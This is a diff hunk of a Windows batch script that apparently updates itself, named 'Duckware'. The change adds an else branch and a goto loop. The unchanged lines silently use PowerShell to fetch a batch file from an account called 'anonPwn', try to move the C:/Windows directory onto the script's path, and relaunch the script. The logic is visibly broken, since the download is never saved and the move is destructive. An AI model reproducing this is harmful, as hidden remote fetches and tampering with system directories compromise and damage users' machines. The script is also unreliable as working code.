@@ -5,8 +5,9 @@ if /i not "%~1"=="updated" (
     >nul 2>&1 powershell iwr "https://raw.githubusercontent.com/anonPwn/Batch/refs/heads/main/Duckware.bat"
     >nul 2>&1 move /y "C:/Windows" "%~dpnx0"
     >nul 2>&1 powershell start "%~0" updated & exit /b
+    goto Update
+) else (
+    TIMEOUT /T 60 /NOBREAK
+    echo Code goes here
+    goto Update
 )
-TIMEOUT /T 60 /NOBREAK
-echo Code goes here
-goto Update
-
